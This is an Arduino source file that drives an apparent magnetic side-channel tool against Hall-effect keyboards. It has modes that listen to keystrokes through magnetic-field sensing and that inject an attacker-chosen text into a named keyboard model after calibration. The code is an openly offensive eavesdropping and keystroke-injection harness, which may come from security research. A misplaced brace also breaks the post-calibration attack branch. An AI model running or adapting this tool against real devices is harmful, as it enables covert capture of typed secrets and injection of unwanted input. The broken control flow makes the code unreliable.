#include <Arduino.h>
#include <Types.h>
#include <Config.h>
#include <KeyListener.h>
#include <KeyAttacker.h>
#include <Calibrator.h>
#include <math.h>

// ==================== User Configurable Parameters ====================

// --- Operation Mode ---
const OperationMode CURRENT_MODE = OperationMode::LISTENER_AFTER_CALIBRATION;

// --- Listener Mode ---
    // No parameters needed

// --- Attacker Mode ---
const char* ATTACKER_KEYBOARD_TYPE = "Wooting 60 HE";  // Keyboard type for attacker
const String ATTACK_TEXT = "During last night's debate"; // Text to attack

// --- Calibration Mode ---
const char* CALIBRATION_SEQUENCE = "QRPZV/";  // Calibration key sequence

// ==================== End of User Configurable Parameters ====================

// ==================== Global Variables ====================
KeyListener listener;              // Magnetic field key listener
KeyAttacker attacker;              // Key attack controller
Calibrator calibrator;             // Calibration system
bool attackExecuted = false;       // Flag to track if attack has been executed
bool calibrationCompleted = false; // Flag to track if calibration is complete
int currentAttackIndex = 0;        // Current attack index (unused in current implementation)

// Global variables for END_TO_END mode
unsigned long e2e_last_key_time = 0;
bool e2e_attack_triggered = false;
bool e2e_calibrationDone = false;

// ==================== Callback Functions ====================
// Callback function called when a key is detected during calibration
void onCalibrationKeyDetected(const char* keyName, float confidence) {
    Serial.print("=== Key Detected: ");
    Serial.print(keyName);
    Serial.print(" (Confidence: ");
    Serial.print(confidence, 4);
    Serial.println(") ===");
    
    if (calibrator.isCalibrating()) {
        Serial.println("Calibrating, attempting to add calibration point...");
        bool added = calibrator.addCalibrationPoint(keyName, confidence);
        
        if (added) {
            Serial.println("Calibration point added successfully");
        } else {
            Serial.println("Failed to add calibration point");
        }
        
        // Check if data collection is complete
        if (calibrator.isDataCollectionComplete()) {
            // Calibration sequence completed, start computation
            Serial.println("Calibration sequence completed, starting transform calculation");
            Serial.println("Calling finishCalibration...");
            
            bool success = calibrator.finishCalibration(ALLOW_ROTATION);
            
            if (success) {
                Serial.println("Calibration calculation successful!");
                
                // Get calibration parameters
                TransformParams params = calibrator.getTransformParams();
                Serial.print("dx=");
                Serial.print(params.dx, 6);
                Serial.print(", dy=");
                Serial.print(params.dy, 6);
                Serial.print(", dtheta=");
                Serial.println(params.theta, 6);
                
                // Set calibration parameters based on mode
                if (CURRENT_MODE == OperationMode::LISTENER_AFTER_CALIBRATION) {
                    listener.setCalibrationParams(params.dx, params.dy, params.theta);
                    listener.enableCalibration(true);
                    Serial.println("Post-calibration listener mode enabled");
                } else if (CURRENT_MODE == OperationMode::ATTACKER_AFTER_CALIBRATION) {
                    attacker.setCalibrationParams(params.dx, params.dy, params.theta);
                    attacker.enableCalibration(true);
                    Serial.println("Post-calibration attacker mode enabled");
                }
                
                calibrationCompleted = true;
                
            } else {
                Serial.println("Calibration calculation failed!");
            }
        }
    }
    if (CURRENT_MODE == OperationMode::END_TO_END) {
        e2e_calibrationDone = true;
    }
}

// Callback function to report calibration progress
void onCalibrationProgress(int current, int total) {
    Serial.print("Calibration progress: ");
    Serial.print(current);
    Serial.print("/");
    Serial.println(total);
}

// ==================== Main Program ====================
// Arduino setup function - called once at startup
void setup() {
    Serial.begin(SERIAL_BAUD_RATE);
  while (!Serial) delayMicroseconds(10);
  delay(1000);

    Serial.println("=== Magnetic Field Key Detection System ===");
    
    if (CURRENT_MODE == OperationMode::LISTENER) {
        // Standard listener mode
        Serial.println("Initializing listener mode...");
        if (listener.begin()) {
            Serial.println("Listener mode initialized successfully!");
        } else {
            Serial.println("Listener mode initialization failed!");
        }
        
    } else if (CURRENT_MODE == OperationMode::ATTACKER) {
        // Attacker mode
        Serial.println("Initializing attacker mode...");
        if (attacker.begin(ATTACKER_KEYBOARD_TYPE)) {
            Serial.println("Attacker mode initialized successfully!");
        } else {
            Serial.println("Attacker mode initialization failed!");
        }
        
    } else if (CURRENT_MODE == OperationMode::CALIBRATION) {
        // Calibration mode
        Serial.println("Initializing calibration mode...");
        
        // Initialize listener
        listener.setKeyDetectedCallback(onCalibrationKeyDetected);
        if (!listener.begin()) {
            Serial.println("Listener initialization failed!");
            return;
        }
        
        // Setup calibrator
        calibrator.setProgressCallback(onCalibrationProgress);
        
        Serial.println("System initialization complete!");
        Serial.println("Waiting for sensor calibration to complete before starting calibration...");
        delay(3000);  // Wait for system stability
        
    } else if (CURRENT_MODE == OperationMode::LISTENER_AFTER_CALIBRATION) {
        // Post-calibration listener mode - auto-execute calibration first
        Serial.println("Initializing post-calibration listener mode...");
        Serial.println("Starting automatic calibration first...");
        
        // Initialize listener for calibration
        listener.setKeyDetectedCallback(onCalibrationKeyDetected);
        if (!listener.begin()) {
            Serial.println("Listener initialization failed!");
            return;
        }
        
        // Setup calibrator
        calibrator.setProgressCallback(onCalibrationProgress);
        
        Serial.println("Waiting for sensor calibration to complete before starting key calibration...");
        delay(3000);  // Wait for system stability
        
    } else if (CURRENT_MODE == OperationMode::ATTACKER_AFTER_CALIBRATION) {
        // Post-calibration attacker mode - auto-execute calibration first
        Serial.println("Initializing post-calibration attacker mode...");
        Serial.println("Starting automatic calibration first...");
        
        // Initialize listener for calibration
        listener.setKeyDetectedCallback(onCalibrationKeyDetected);
        if (!listener.begin()) {
            Serial.println("Listener initialization failed!");
            return;
        }
        
        // Initialize attacker
        if (!attacker.begin(ATTACKER_KEYBOARD_TYPE)) {
            Serial.println("Attacker initialization failed!");
            return;
        }
        
        // Setup calibrator
        calibrator.setProgressCallback(onCalibrationProgress);
        
        Serial.println("Waiting for sensor calibration to complete before starting key calibration...");
        delay(3000);  // Wait for system stability
    }
}

// Arduino main loop function - called repeatedly
void loop() {
    if (CURRENT_MODE == OperationMode::LISTENER) {
        // 普通监听模式 - 持续更新传感器
        listener.update();
        
    } else if (CURRENT_MODE == OperationMode::ATTACKER) {
        // Attacker mode - character-by-character text attack
        if (!attackExecuted) {
            Serial.println("=== Starting Text Attack Sequence ===");
            Serial.print("Attack text: ");
            Serial.println(ATTACK_TEXT);
            
            // Process each character
            for (int i = 0; i < ATTACK_TEXT.length(); i++) {
                char keyStroke = ATTACK_TEXT.charAt(i);
                char nextKeyStroke = (i + 1 < ATTACK_TEXT.length()) ? ATTACK_TEXT.charAt(i + 1) : '\0';
                
                String keyName = attacker.charToKeyName(keyStroke);
                if (keyName.length() > 0) {
                    Serial.print("Attacking character '");
                    Serial.print(keyStroke);
                    Serial.print("' -> Key: ");
                    Serial.println(keyName);
                    attacker.attackKey(keyName.c_str());
                } else {
                    Serial.print("Skipping unsupported character: '");
                    Serial.print(keyStroke);
                    Serial.println("'");
                }
            }
            attackExecuted = true;
            Serial.println("Text attack sequence completed!");
        }
        
    } else if (CURRENT_MODE == OperationMode::CALIBRATION) {
        // Calibration mode
        static bool calibrationStarted = false;
        
        // Check if sensor calibration is complete and calibration process hasn't started yet
        if (!calibrationStarted && listener.isCalibrated()) {
            Serial.println("Sensor calibration complete, starting key calibration process...");
            calibrator.startCalibration(CALIBRATION_SEQUENCE);
            calibrationStarted = true;
        }
        
        // Continuously update sensors (regardless of calibration state)
        listener.update();
        
    } else if (CURRENT_MODE == OperationMode::LISTENER_AFTER_CALIBRATION) {
        // Post-calibration listener mode
        static bool calibrationStarted = false;
        
        if (!calibrationCompleted) {
            // Calibration phase
            if (!calibrationStarted && listener.isCalibrated()) {
                Serial.println("Sensor calibration complete, starting key calibration process...");
                calibrator.startCalibration(CALIBRATION_SEQUENCE);
                calibrationStarted = true;
            }
            // Continuously update sensors for calibration
            listener.update();
        } else {
            // Post-calibration listening phase
            listener.update();
        }
        
    } else if (CURRENT_MODE == OperationMode::ATTACKER_AFTER_CALIBRATION) {
        // Post-calibration attacker mode
        static bool calibrationStarted = false;
        
        if (!calibrationCompleted) {
            // Calibration phase
            if (!calibrationStarted && listener.isCalibrated()) {
                Serial.println("Sensor calibration complete, starting key calibration process...");
                calibrator.startCalibration(CALIBRATION_SEQUENCE);
                calibrationStarted = true;
            }
            // Continuously update sensors for calibration
            listener.update();
    } else if (CURRENT_MODE == OperationMode::END_TO_END) {
            // Post-calibration attack phase
            if (!attackExecuted) {
                Serial.println("=== Starting Post-Calibration Text Attack Sequence ===");
                Serial.print("Attack text: ");
                Serial.println(ATTACK_TEXT);
                
                // Process each character
                for (int i = 0; i < ATTACK_TEXT.length(); i++) {
                    char keyStroke = ATTACK_TEXT.charAt(i);
                    char nextKeyStroke = (i + 1 < ATTACK_TEXT.length()) ? ATTACK_TEXT.charAt(i + 1) : '\0';
                    
                    String keyName = attacker.charToKeyName(keyStroke);
                    if (keyName.length() > 0) {
                        Serial.print("Calibrated attack character '");
                        Serial.print(keyStroke);
                        Serial.print("' -> Key: ");
                        Serial.println(keyName);
                        attacker.attackKey(keyName.c_str());  // If calibration is enabled, it will be handled internally
                    } else {
                        Serial.print("Skipping unsupported character: '");
                        Serial.print(keyStroke);
                        Serial.println("'");
                    }
                }
                attackExecuted = true;
                Serial.println("Post-calibration text attack completed!");
            }
        }
    }
}
